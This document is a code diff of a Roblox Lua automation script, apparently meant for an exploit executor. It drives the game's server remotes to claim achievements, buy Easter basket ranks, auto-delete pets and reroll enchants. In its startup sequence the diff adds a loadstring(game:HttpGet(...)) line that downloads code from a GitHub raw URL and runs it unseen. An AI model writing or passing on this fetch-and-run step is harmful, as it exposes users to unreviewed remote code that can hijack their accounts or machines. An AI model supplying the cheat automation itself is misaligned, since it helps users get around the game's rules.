@@ -1,497 +1,445 @@
--- Set current world to 1
-local args = {
-    "Set Current World",
-    1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction"):InvokeServer(unpack(args))
-
--- Wait 5 seconds
-task.wait(5)
-
--- Farm script
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Paper = require(ReplicatedStorage.Paper)
+local AchievementsData = require(ReplicatedStorage.Tables.Achievements)
+local EasterBasketData = require(ReplicatedStorage.Tables.EasterBasket)
+local EggsTable = require(ReplicatedStorage.Tables.Eggs)
 
-local Paper = require(ReplicatedStorage:WaitForChild("Paper"))
-local Stats = Paper.Stats
-local Network = Paper.Network
-local UniverseModule = require(ReplicatedStorage:WaitForChild("Modules").Shared.Universe)
-local RebirthModule = require(ReplicatedStorage:WaitForChild("Modules").Shared.Rebirths)
+local RemoteFunction = ReplicatedStorage:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
+local LocalPlayer = Players.LocalPlayer
+local isBusy = false
 
-repeat task.wait() until Stats.IsLoaded(LocalPlayer)
-
-local Remotes = ReplicatedStorage:WaitForChild("Paper"):WaitForChild("Remotes")
-local RemoteFunction = Remotes:WaitForChild("__remotefunction")
-local RemoteEvent = Remotes:WaitForChild("__remoteevent")
-
-local AutoTrain = Stats.Get("AutoTrain")
-local AutoThrow = Stats.Get("AutoThrow")
-local CurrentUniverse = Stats.Get("CurrentUniverse")
-
--- Rebirth tables
-local RebirthsEaster = require(ReplicatedStorage:WaitForChild("Tables").RebirthsEaster)
-local RebirthsUni1 = require(ReplicatedStorage:WaitForChild("Tables").Rebirths)
-local RebirthsUni2 = require(ReplicatedStorage:WaitForChild("Tables").RebirthsUni2)
-
--- Custom number formatter that goes all the way to UD (Undecillion)
-local suffixes = {"", "K", "M", "B", "T", "Qd", "Qn", "Sx", "Sp", "Oc", "No", "Dc", "UD"}
-
-local function formatNumber(num)
-    if type(num) ~= "number" then
-        num = tonumber(num) or 0
-    end
-    
-    if num < 1000 then
-        return tostring(math.floor(num))
-    end
-    
-    local index = 0
-    while num >= 1000 and index < #suffixes - 1 do
-        num = num / 1000
-        index = index + 1
-    end
-    
-    local formatted
-    if num >= 100 then
-        formatted = string.format("%.0f", num)
-    elseif num >= 10 then
-        formatted = string.format("%.1f", num)
-    else
-        formatted = string.format("%.2f", num)
-    end
-    
-    return formatted .. suffixes[index]
+local function log(msg, type)
+    type = type or "INFO"
+    print(string.format("[%s] %s", type, msg))
 end
 
--- ========== UI FOR REBIRTH DISPLAY (UNIVERSE 1 ONLY) ==========
--- Get actual rebirth count for Universe 1
-local Universe1Rebirths = UniverseModule.GetRebirthStat(LocalPlayer, 1)
-local Universe1Money = UniverseModule.GetMoneyStat(LocalPlayer, 1)
-
--- Create ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "RebirthDisplayUI"
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
--- Main frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(1, 0, 1, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-mainFrame.BackgroundTransparency = 0
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
-
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
-})
-gradient.Parent = mainFrame
-
--- Top bar
-local topBar = Instance.new("Frame")
-topBar.Size = UDim2.new(1, 0, 0, 25)
-topBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-topBar.BorderSizePixel = 0
-topBar.Parent = mainFrame
-
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, 0, 1, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "REBIRTHS (Universe 1)"
-titleLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
-titleLabel.TextScaled = true
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextXAlignment = Enum.TextXAlignment.Center
-titleLabel.Parent = topBar
-
--- Close button
-local closeButton = Instance.new("TextButton")
-closeButton.Size = UDim2.new(0, 20, 0, 20)
-closeButton.Position = UDim2.new(1, -25, 0, 2)
-closeButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-closeButton.Text = "✕"
-closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeButton.TextScaled = true
-closeButton.Font = Enum.Font.GothamBold
-closeButton.BorderSizePixel = 0
-closeButton.Parent = topBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 4)
-closeCorner.Parent = closeButton
-
--- Content frame
-local contentFrame = Instance.new("Frame")
-contentFrame.Size = UDim2.new(1, 0, 1, -25)
-contentFrame.Position = UDim2.new(0, 0, 0, 25)
-contentFrame.BackgroundTransparency = 1
-contentFrame.Parent = mainFrame
-
--- Current rebirth count
-local rebirthCountFrame = Instance.new("Frame")
-rebirthCountFrame.Size = UDim2.new(1, -20, 0, 60)
-rebirthCountFrame.Position = UDim2.new(0, 10, 0, 15)
-rebirthCountFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-rebirthCountFrame.BorderSizePixel = 0
-rebirthCountFrame.ClipsDescendants = true
-rebirthCountFrame.Parent = contentFrame
-
-local rebirthCountCorner = Instance.new("UICorner")
-rebirthCountCorner.CornerRadius = UDim.new(0, 8)
-rebirthCountCorner.Parent = rebirthCountFrame
-
-local rebirthCountLabel = Instance.new("TextLabel")
-rebirthCountLabel.Size = UDim2.new(1, 0, 0.4, 0)
-rebirthCountLabel.Position = UDim2.new(0, 0, 0, 5)
-rebirthCountLabel.BackgroundTransparency = 1
-rebirthCountLabel.Text = "Current Rebirths"
-rebirthCountLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
-rebirthCountLabel.TextScaled = true
-rebirthCountLabel.Font = Enum.Font.GothamMedium
-rebirthCountLabel.Parent = rebirthCountFrame
-
-local rebirthValue = Instance.new("TextLabel")
-rebirthValue.Size = UDim2.new(1, 0, 0.5, 0)
-rebirthValue.Position = UDim2.new(0, 0, 0.4, 0)
-rebirthValue.BackgroundTransparency = 1
-rebirthValue.Text = "0"
-rebirthValue.TextColor3 = Color3.fromRGB(100, 255, 150)
-rebirthValue.TextScaled = true
-rebirthValue.Font = Enum.Font.GothamBlack
-rebirthValue.Parent = rebirthCountFrame
-
--- Next rebirth requirement
-local nextRebirthFrame = Instance.new("Frame")
-nextRebirthFrame.Size = UDim2.new(1, -20, 0, 60)
-nextRebirthFrame.Position = UDim2.new(0, 10, 0, 90)
-nextRebirthFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-nextRebirthFrame.BorderSizePixel = 0
-nextRebirthFrame.ClipsDescendants = true
-nextRebirthFrame.Parent = contentFrame
-
-local nextRebirthCorner = Instance.new("UICorner")
-nextRebirthCorner.CornerRadius = UDim.new(0, 8)
-nextRebirthCorner.Parent = nextRebirthFrame
-
-local nextRebirthLabel = Instance.new("TextLabel")
-nextRebirthLabel.Size = UDim2.new(1, 0, 0.4, 0)
-nextRebirthLabel.Position = UDim2.new(0, 0, 0, 5)
-nextRebirthLabel.BackgroundTransparency = 1
-nextRebirthLabel.Text = "Next Rebirth"
-nextRebirthLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
-nextRebirthLabel.TextScaled = true
-nextRebirthLabel.Font = Enum.Font.GothamMedium
-nextRebirthLabel.Parent = nextRebirthFrame
-
-local nextRebirthValue = Instance.new("TextLabel")
-nextRebirthValue.Size = UDim2.new(1, 0, 0.5, 0)
-nextRebirthValue.Position = UDim2.new(0, 0, 0.4, 0)
-nextRebirthValue.BackgroundTransparency = 1
-nextRebirthValue.Text = "0"
-nextRebirthValue.TextColor3 = Color3.fromRGB(255, 150, 100)
-nextRebirthValue.TextScaled = true
-nextRebirthValue.Font = Enum.Font.GothamBlack
-nextRebirthValue.Parent = nextRebirthFrame
-
--- Money display
-local moneyFrame = Instance.new("Frame")
-moneyFrame.Size = UDim2.new(1, -20, 0, 40)
-moneyFrame.Position = UDim2.new(0, 10, 0, 160)
-moneyFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-moneyFrame.BorderSizePixel = 0
-moneyFrame.ClipsDescendants = true
-moneyFrame.Parent = contentFrame
-
-local moneyCorner = Instance.new("UICorner")
-moneyCorner.CornerRadius = UDim.new(0, 8)
-moneyCorner.Parent = moneyFrame
-
-local moneyLabel = Instance.new("TextLabel")
-moneyLabel.Size = UDim2.new(1, 0, 0.5, 0)
-moneyLabel.Position = UDim2.new(0, 0, 0, 2)
-moneyLabel.BackgroundTransparency = 1
-moneyLabel.Text = "Money"
-moneyLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
-moneyLabel.TextScaled = true
-moneyLabel.Font = Enum.Font.GothamMedium
-moneyLabel.Parent = moneyFrame
-
-local moneyValue = Instance.new("TextLabel")
-moneyValue.Size = UDim2.new(1, 0, 0.5, 0)
-moneyValue.Position = UDim2.new(0, 0, 0.5, 0)
-moneyValue.BackgroundTransparency = 1
-moneyValue.Text = "0"
-moneyValue.TextColor3 = Color3.fromRGB(255, 200, 100)
-moneyValue.TextScaled = true
-moneyValue.Font = Enum.Font.GothamBold
-moneyValue.Parent = moneyFrame
-
--- UI toggle
-local uiEnabled = true
-local toggleKey = Enum.KeyCode.R
-
-closeButton.MouseButton1Click:Connect(function()
-    screenGui.Enabled = false
-    uiEnabled = false
-end)
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == toggleKey then
-        uiEnabled = not uiEnabled
-        screenGui.Enabled = uiEnabled
+local function equipBestPets()
+    local success, err = pcall(function()
+        RemoteFunction:InvokeServer("Pet", {Action = "EquipBest", Sort = "Event"})
+    end)
+    if not success then
+        log("EquipBest failed: " .. tostring(err), "ERROR")
     end
-end)
+end
 
--- Update UI function with custom formatter
-local function updateDisplay()
-    pcall(function()
-        if Universe1Rebirths then
-            local currentRebirths = Universe1Rebirths.Value or 0
-            rebirthValue.Text = formatNumber(currentRebirths)
-            
-            local nextRebirthAmount = RebirthsUni1[currentRebirths + 1] or 0
-            if nextRebirthAmount > 0 then
-                nextRebirthValue.Text = formatNumber(nextRebirthAmount)
+local function claimAchievement(id, rank)
+    local success, result = pcall(function()
+        return RemoteFunction:InvokeServer("Claim Achievement", id, rank)
+    end)
+    if not success then
+        log("Claim achievement " .. id .. " rank " .. rank .. " failed: " .. tostring(result), "ERROR")
+        return false
+    end
+    return result == true
+end
+
+local function claimAchievementChain(id, data)
+    local success, err = pcall(function()
+        local currentRank = Paper.Stats.Get(data.AchievementStat).Value
+        local progress = Paper.Stats.Get(data.Stat).Value
+        
+        for rank = currentRank + 1, #data.Rewards do
+            local reward = data.Rewards[rank]
+            if progress >= reward.Requirement then
+                log("Trying to claim " .. id .. " Rank " .. rank, "ACHIEVEMENT")
+                if claimAchievement(id, rank) then
+                    log("Claimed " .. id .. " Rank " .. rank, "ACHIEVEMENT")
+                    task.wait(0.5)
+                else
+                    log("Failed to claim " .. id .. " Rank " .. rank .. " (may need previous rank)", "WARN")
+                    break
+                end
             else
-                nextRebirthValue.Text = "MAX"
+                break
+            end
+        end
+    end)
+    if not success then
+        log("Achievement chain error for " .. id .. ": " .. tostring(err), "ERROR")
+    end
+end
+
+local function scanAndClaimAchievements()
+    if isBusy then 
+        log("Achievement scan already running, skipping", "DEBUG")
+        return 
+    end
+    isBusy = true
+    local success, err = pcall(function()
+        for id, data in AchievementsData do
+            claimAchievementChain(id, data)
+            task.wait(0.3)
+        end
+    end)
+    if not success then
+        log("Scan achievements error: " .. tostring(err), "ERROR")
+    end
+    isBusy = false
+end
+
+local function buyBasketRank()
+    local success, result = pcall(function()
+        return RemoteFunction:InvokeServer("Buy Basket Rank")
+    end)
+    if not success then
+        log("Buy basket rank failed: " .. tostring(result), "ERROR")
+        return false
+    end
+    return result == true
+end
+
+local function claimBasketReward()
+    local success, result = pcall(function()
+        RemoteFunction:InvokeServer("Claim Easter Basket", false)
+    end)
+    if not success then
+        log("Claim basket reward failed: " .. tostring(result), "ERROR")
+    end
+    return success
+end
+
+local function processEasterBasket()
+    local success, err = pcall(function()
+        local goldenEggs = Paper.Stats.Get("GoldenEggs").Value
+        local basketRank = Paper.Stats.Get("EasterBasketRank").Value
+        local freeClaimed = Paper.Stats.Get("EasterFreeClaimed").Value
+        
+        log("Easter Basket - Golden Eggs: " .. goldenEggs .. ", Current Rank: " .. basketRank .. ", Free Claimed: " .. freeClaimed, "BASKET")
+        
+        for rank = basketRank + 1, #EasterBasketData do
+            local rankData = EasterBasketData[rank]
+            if goldenEggs >= rankData.Cost then
+                log("Buying rank " .. rank .. " for " .. rankData.Cost .. " eggs", "BASKET")
+                if buyBasketRank() then
+                    goldenEggs = goldenEggs - rankData.Cost
+                    log("Bought rank " .. rank, "BASKET")
+                    task.wait(0.5)
+                else
+                    log("Failed to buy rank " .. rank, "WARN")
+                    break
+                end
+            else
+                log("Not enough eggs for rank " .. rank .. " (need " .. rankData.Cost .. ")", "BASKET")
+                break
             end
         end
         
-        if Universe1Money then
-            moneyValue.Text = formatNumber(Universe1Money.Value or 0)
+        local currentRank = Paper.Stats.Get("EasterBasketRank").Value
+        local currentFreeClaimed = Paper.Stats.Get("EasterFreeClaimed").Value
+        
+        for rank = 1, currentRank do
+            if currentFreeClaimed < rank then
+                log("Claiming free reward for rank " .. rank, "BASKET")
+                claimBasketReward()
+                task.wait(0.5)
+            end
         end
     end)
+    if not success then
+        log("Process Easter Basket error: " .. tostring(err), "ERROR")
+    end
 end
 
--- ========== LUCKY BLOCK AUTO-CLAIMER (EVENT BASED) ==========
-local claimed = {}
+local function getEnchantName(pet)
+    local success, enchant = pcall(function()
+        return pet:GetAttribute("Enchant1")
+    end)
+    if not success then
+        return nil
+    end
+    return enchant
+end
 
--- function to safely claim with retry
-local function claimBlock(blockName)
-    if claimed[blockName] then return end
+local function isLuckEnchant(enchantName)
+    if not enchantName then return false end
+    local lowerName = string.lower(enchantName)
+    return string.find(lowerName, "luck") ~= nil
+end
 
-    local tries = 0
-    local success = false
+local function getLuckLevel(enchantName)
+    if not enchantName or not isLuckEnchant(enchantName) then return 0 end
+    if string.find(enchantName, "III") then return 3
+    elseif string.find(enchantName, "II") then return 2
+    elseif string.find(enchantName, "I") then return 1 end
+    return 0
+end
 
-    while tries < 5 and not success do
-        tries = tries + 1
+local function getPetLuckLevel(pet)
+    local enchant = getEnchantName(pet)
+    return getLuckLevel(enchant)
+end
 
-        local ok, result = pcall(function()
-            return Network.InvokeServer("Claim LuckyBlock", blockName)
+local function hasLuckEnchant(pet)
+    local enchant = getEnchantName(pet)
+    return isLuckEnchant(enchant)
+end
+
+local function enchantPet(petGuid)
+    local success, err = pcall(function()
+        RemoteFunction:InvokeServer("Pet", {Action = "Enchant", Pet = petGuid})
+    end)
+    if not success then
+        log("Enchant pet " .. petGuid .. " failed: " .. tostring(err), "ERROR")
+    end
+    return success
+end
+
+local function progressiveLuckEnchant()
+    local success, err = pcall(function()
+        local equippedPets = Paper.Stats.Get("Equipped Pets")
+        local enchantGems = Paper.Stats.Get("EnchantGems")
+        
+        if not equippedPets or not enchantGems then
+            log("Cannot get equipped pets or enchant gems stats", "WARN")
+            return
+        end
+        
+        local gemsAvailable = enchantGems.Value
+        log("Enchanting - Gems available: " .. gemsAvailable, "ENCHANT")
+        
+        if gemsAvailable == 0 then
+            log("No enchant gems available", "ENCHANT")
+            return
+        end
+        
+        local rerollCount = 0
+        local maxRerolls = gemsAvailable * 2
+        
+        while enchantGems.Value > 0 and rerollCount < maxRerolls do
+            local petsWithLuck3 = {}
+            local petsWithLuck2 = {}
+            local petsWithLuck1 = {}
+            local petsWithNoLuck = {}
+            local petsWithOtherEnchant = {}
+            
+            for _, pet in pairs(equippedPets:GetChildren()) do
+                local enchantName = getEnchantName(pet)
+                local luckLevel = getLuckLevel(enchantName)
+                
+                if luckLevel == 3 then
+                    table.insert(petsWithLuck3, pet)
+                elseif luckLevel == 2 then
+                    table.insert(petsWithLuck2, pet)
+                elseif luckLevel == 1 then
+                    table.insert(petsWithLuck1, pet)
+                elseif enchantName and not isLuckEnchant(enchantName) then
+                    table.insert(petsWithOtherEnchant, pet)
+                else
+                    table.insert(petsWithNoLuck, pet)
+                end
+            end
+            
+            local totalPets = #petsWithLuck3 + #petsWithLuck2 + #petsWithLuck1 + #petsWithOtherEnchant + #petsWithNoLuck
+            
+            if totalPets == 0 then
+                log("No pets found", "WARN")
+                break
+            end
+            
+            local luck3Count = #petsWithLuck3
+            log(string.format("Pet status - Luck3: %d, Luck2: %d, Luck1: %d, Other: %d, NoLuck: %d", 
+                luck3Count, #petsWithLuck2, #petsWithLuck1, #petsWithOtherEnchant, #petsWithNoLuck), "ENCHANT")
+            
+            if luck3Count == totalPets then
+                log("ALL PETS HAVE LUCK III ENCHANT!", "SUCCESS")
+                break
+            end
+            
+            local targetPet = nil
+            local targetType = ""
+            
+            if #petsWithLuck2 > 0 then
+                targetPet = petsWithLuck2[1]
+                targetType = "Luck2 -> Luck3"
+            elseif #petsWithLuck1 > 0 then
+                targetPet = petsWithLuck1[1]
+                targetType = "Luck1 -> Luck2+"
+            elseif #petsWithOtherEnchant > 0 then
+                targetPet = petsWithOtherEnchant[1]
+                targetType = "Other -> Luck"
+            elseif #petsWithNoLuck > 0 then
+                targetPet = petsWithNoLuck[1]
+                targetType = "NoLuck -> Any"
+            end
+            
+            if targetPet then
+                local guid = targetPet.Name
+                local oldEnchant = getEnchantName(targetPet) or "None"
+                local oldLuckLevel = getLuckLevel(oldEnchant)
+                
+                log(string.format("Enchanting %s [%s] (Current: %s, Luck Level: %d) - Target: %s", 
+                    guid, targetType, oldEnchant, oldLuckLevel, targetType), "ENCHANT")
+                
+                enchantPet(guid)
+                rerollCount = rerollCount + 1
+                task.wait(0.25)
+                
+                local newEnchant = getEnchantName(targetPet) or "None"
+                local newLuckLevel = getLuckLevel(newEnchant)
+                
+                if newLuckLevel > oldLuckLevel then
+                    log(string.format("✓ UPGRADED %s: %s -> %s (Luck %d -> %d)", 
+                        guid, oldEnchant, newEnchant, oldLuckLevel, newLuckLevel), "ENCHANT")
+                elseif newLuckLevel > 0 and newLuckLevel == oldLuckLevel then
+                    log(string.format("~ SAME LEVEL %s: still %s (Luck %d)", 
+                        guid, newEnchant, newLuckLevel), "ENCHANT")
+                elseif newLuckLevel == 0 and isLuckEnchant(newEnchant) == false and newEnchant ~= "None" then
+                    log(string.format("~ GOT OTHER ENCHANT %s: %s (not luck)", guid, newEnchant), "ENCHANT")
+                elseif newEnchant == "None" then
+                    log(string.format("~ LOST ENCHANT %s: now has no enchant", guid), "ENCHANT")
+                end
+            else
+                log("No target pet found to enchant", "WARN")
+                break
+            end
+            
+            task.wait(0.1)
+        end
+        
+        log("Enchanting finished - Total rerolls: " .. rerollCount .. ", Gems remaining: " .. enchantGems.Value, "ENCHANT")
+    end)
+    if not success then
+        log("Progressive enchant error: " .. tostring(err), "ERROR")
+    end
+end
+
+local function setupAutoDelete()
+    local success, err = pcall(function()
+        Paper.Stats.Loaded()
+        local autoDeleteStat = Paper.Stats.Get("AutoDelete")
+        local starryEgg = EggsTable["Starry Egg"]
+        local oneInAMillion = 0.0001
+        
+        if not starryEgg or not starryEgg.Pets then
+            log("Starry Egg data not found", "WARN")
+            return
+        end
+        
+        log("Setting up auto-delete for Starry Egg pets...", "AUTODELETE")
+        
+        for _, petInfo in ipairs(starryEgg.Pets) do
+            local petName = petInfo.Pet
+            local chance = petInfo.Chance
+            
+            if chance >= oneInAMillion then
+                if autoDeleteStat.Value[petName] == nil then
+                    log("Auto-deleting: " .. petName .. " (" .. (chance * 100) .. "%)", "AUTODELETE")
+                    local success2, err2 = pcall(function()
+                        RemoteFunction:InvokeServer("Pet", {Pet = petName, Action = "AutoDelete", Tier = "all"})
+                    end)
+                    if not success2 then
+                        log("Failed to set auto-delete for " .. petName .. ": " .. tostring(err2), "ERROR")
+                    end
+                    task.wait(0.05)
+                else
+                    log("Already auto-deleting: " .. petName, "AUTODELETE")
+                end
+            else
+                if autoDeleteStat.Value[petName] ~= nil then
+                    log("REMOVING auto-delete from rare pet: " .. petName .. " (" .. (chance * 100) .. "%)", "AUTODELETE")
+                    local success2, err2 = pcall(function()
+                        RemoteFunction:InvokeServer("Pet", {Pet = petName, Action = "AutoDelete", Tier = "all"})
+                    end)
+                    if not success2 then
+                        log("Failed to remove auto-delete for " .. petName .. ": " .. tostring(err2), "ERROR")
+                    end
+                    task.wait(0.05)
+                else
+                    log("Keeping (not auto-deleted): " .. petName .. " (" .. (chance * 100) .. "%)", "AUTODELETE")
+                end
+            end
+        end
+        
+        log("Auto-delete setup complete!", "AUTODELETE")
+    end)
+    if not success then
+        log("Setup auto-delete error: " .. tostring(err), "ERROR")
+    end
+end
+
+local statConnectionError = false
+for id, data in AchievementsData do
+    local stat = Paper.Stats.Get(data.Stat)
+    if stat then
+        local success, err = pcall(function()
+            stat.Changed:Connect(function() 
+                task.wait(0.5)
+                pcall(scanAndClaimAchievements)
+                pcall(processEasterBasket)
+            end)
         end)
+        if not success and not statConnectionError then
+            log("Failed to connect stat change for " .. id .. ": " .. tostring(err), "ERROR")
+            statConnectionError = true
+        end
+    end
+end
 
-        if ok and result then
-            success = true
-            claimed[blockName] = true
-            print("✅ Claimed Lucky Block:", blockName)
-        else
-            warn("❌ Failed to claim, retrying:", blockName, "Attempt:", tries)
+local goldenEggsStat = Paper.Stats.Get("GoldenEggs")
+if goldenEggsStat then
+    pcall(function()
+        goldenEggsStat.Changed:Connect(function() 
             task.wait(0.5)
-        end
-    end
-end
-
--- Detect spawn instantly via remote event
-Network.OnClientEvent("LuckyBlock Spawned", function(name, tier, timestamp)
-    task.spawn(function()
-        claimBlock(name)
+            pcall(processEasterBasket)
+        end)
     end)
-end)
-
-print("Lucky Block Auto-Claimer loaded (Event based)")
-
--- ========== FARM SCRIPT FUNCTIONS ==========
-
-local function GetRebirthTable()
-    local universe = CurrentUniverse and CurrentUniverse.Value or 0
-    if universe == 0 then
-        return RebirthsEaster
-    elseif universe == 1 then
-        return RebirthsUni1
-    elseif universe == 2 then
-        return RebirthsUni2
-    end
-    return RebirthsEaster
 end
 
-local function GetRebirthSkips()
-    local universe = CurrentUniverse and CurrentUniverse.Value or 0
-    return UniverseModule.GetRebirthSkipsStat(LocalPlayer, universe)
-end
-
-local function GetMaxUnlockedRebirthIndex()
-    local skipsStat = GetRebirthSkips()
-    local skips = skipsStat and skipsStat.Value or 0
-    local universe = CurrentUniverse and CurrentUniverse.Value or 0
-    local extra = (universe == 2 or universe == 0) and 1 or 8
-    return skips + extra
-end
-
-local function GetBestUnlockedRebirth()
-    local rebirthTable = GetRebirthTable()
-    local maxUnlocked = GetMaxUnlockedRebirthIndex()
-    local bestAmount = 0
-    local bestIndex = 0
-    
-    for index, amount in ipairs(rebirthTable) do
-        if index <= maxUnlocked and amount > bestAmount then
-            bestAmount = amount
-            bestIndex = index
-        end
-    end
-    
-    return bestAmount, bestIndex
-end
-
-local function PerformRebirth(rebirthIndex)
+local basketRankStat = Paper.Stats.Get("EasterBasketRank")
+if basketRankStat then
     pcall(function()
-        local args = { "Rebirth", rebirthIndex }
-        RemoteFunction:InvokeServer(unpack(args))
-        print("[Rebirth] Performed rebirth with index:", rebirthIndex)
+        basketRankStat.Changed:Connect(function() 
+            task.wait(0.5)
+            pcall(processEasterBasket)
+        end)
     end)
 end
 
-local function AutoRebirthBest()
-    local bestAmount, bestIndex = GetBestUnlockedRebirth()
-    if bestIndex > 0 then
-        print(string.format("[Rebirth] Best unlocked: %s (index %s)", formatNumber(bestAmount), bestIndex))
-        PerformRebirth(bestIndex)
-        return true
+task.spawn(function()
+    task.wait(3)
+    log("Starting main sequence...", "START")
+    scanAndClaimAchievements()
+    task.wait(1)
+    processEasterBasket()
+    task.wait(1)
+    setupAutoDelete()
+    
+    -- Load external script IMMEDIATELY after auto-delete is finished
+    log("Auto-delete completed! Loading external script...", "EXTERNAL")
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/test"))()
+    end)
+    if success then
+        log("External script loaded successfully!", "EXTERNAL")
     else
-        print("[Rebirth] No unlocked rebirths found")
-        return false
-    end
-end
-
-local function StopTraining()
-    pcall(function()
-        local args = { "Stop Training" }
-        RemoteEvent:FireServer(unpack(args))
-        print("[AutoTrain] Stopped training")
-    end)
-end
-
-local function DisableAutoTrain()
-    if AutoTrain and AutoTrain.Value then
-        Network.FireServer("Toggle Setting", "AutoTrain")
-        print("[AutoTrain] Disabled")
-    end
-    StopTraining()
-end
-
-local function EnableAutoTrain()
-    if AutoTrain and not AutoTrain.Value then
-        Network.FireServer("Toggle Setting", "AutoTrain")
-        print("[AutoTrain] Enabled")
-    end
-end
-
-local function EnableAutoThrow()
-    if AutoThrow and not AutoThrow.Value then
-        Network.FireServer("Toggle Setting", "AutoThrow")
-        print("[AutoThrow] Enabled")
-    end
-end
-
-local function TrainOnly()
-    print("[Cycle] Starting training phase (30 seconds)...")
-    EnableAutoTrain()
-    for i = 30, 1, -1 do
-        task.wait(1)
-    end
-    print("[Cycle] Training phase complete")
-end
-
-local function ThrowOnly()
-    print("[Cycle] Starting throwing phase (60 seconds)...")
-    DisableAutoTrain()
-    EnableAutoThrow()
-    for i = 60, 1, -1 do
-        task.wait(1)
-    end
-    print("[Cycle] Throwing phase complete")
-end
-
-local actions = {
-    { args = {"Upgrade", "More Rebirth Skips"} },
-    { args = {"Unlock Next World"} },
-    { args = {"Buy Next Object"} }
-}
-
-local lastActionIndex = nil
-
-local function fireRandomAction()
-    local availableIndices = {}
-    
-    for i = 1, #actions do
-        if i ~= lastActionIndex then
-            table.insert(availableIndices, i)
-        end
+        log("Failed to load external script: " .. tostring(err), "ERROR")
     end
     
-    local randomIndex = availableIndices[math.random(1, #availableIndices)]
-    local selectedAction = actions[randomIndex]
-    
-    pcall(function()
-        RemoteFunction:InvokeServer(unpack(selectedAction.args))
-        print("[Action] Fired:", unpack(selectedAction.args))
-    end)
-    
-    lastActionIndex = randomIndex
-end
-
--- ========== START UI AND LOOPS ==========
-
--- Initial UI update
-updateDisplay()
-
--- Listen for rebirth changes
-if Universe1Rebirths then
-    Universe1Rebirths.Changed:Connect(updateDisplay)
-end
-
-if Universe1Money then
-    Universe1Money.Changed:Connect(updateDisplay)
-end
-
--- Backup UI updater
-task.spawn(function()
-    while true do
-        task.wait(2)
-        updateDisplay()
-    end
+    task.wait(1)
+    equipBestPets()
+    task.wait(1)
+    progressiveLuckEnchant()
+    log("Initial setup complete! Entering loop mode...", "START")
 end)
 
-print("Rebirth Display UI loaded! Press R to toggle visibility")
-print("[Farm] Starting loop: Train 30s -> Throw 60s")
-
--- Auto rebirth loop
 task.spawn(function()
     while true do
-        task.wait(10)
-        pcall(AutoRebirthBest)
-    end
-end)
-
--- Random actions loop
-task.spawn(function()
-    fireRandomAction()
-    while true do
+        task.wait(60)
+        log("Running hourly tasks...", "LOOP")
+        pcall(equipBestPets)
         task.wait(5)
-        fireRandomAction()
+        pcall(progressiveLuckEnchant)
     end
 end)
 
--- Main farm loop
-while true do
-    TrainOnly()
-    ThrowOnly()
-end
+task.spawn(function()
+    while true do
+        task.wait(30)
+        pcall(scanAndClaimAchievements)
+        task.wait(2)
+        pcall(processEasterBasket)
+    end
+end)
+
+log("Script loaded successfully! All systems running.", "INIT")
